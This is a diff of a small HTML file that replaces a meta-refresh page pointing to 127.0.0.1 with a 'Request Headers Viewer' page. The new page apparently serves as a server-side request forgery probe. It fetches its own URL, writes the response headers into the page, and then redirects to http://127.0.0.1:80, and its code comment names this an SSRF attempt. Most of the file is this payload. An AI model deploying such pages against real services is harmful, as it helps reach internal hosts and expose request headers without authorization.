@@ -1,9 +1,42 @@
-<html>
+<!-- <html>
   <head>
     <meta http-equiv="refresh" content="0;url=http://127.0.0.1" />
     <title>Get OUT</title>
   </head>
  <body>
 <p>Hello World new</p>
+</body>
+</html>
+ -->]
+
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Headers Viewer</title>
+    <script>
+        async function getHeaders() {
+            const response = await fetch(window.location.href, { method: "GET" });
+            const headers = [...response.headers.entries()];
+
+            let headersText = "<h2>Captured Request Headers:</h2><ul>";
+            headers.forEach(([key, value]) => {
+                headersText += `<li><strong>${key}:</strong> ${value}</li>`;
+            });
+            headersText += "</ul>";
+
+            document.getElementById("headers").innerHTML = headersText;
+
+            // 🚀 Attempt SSRF by redirecting to 127.0.0.1:80
+            setTimeout(() => {
+                window.location.href = "http://127.0.0.1:80";
+            }, 3000);
+        }
+    </script>
+</head>
+<body onload="getHeaders()">
+    <h1>Fetching Request Headers...</h1>
+    <div id="headers"></div>
 </body>
 </html>
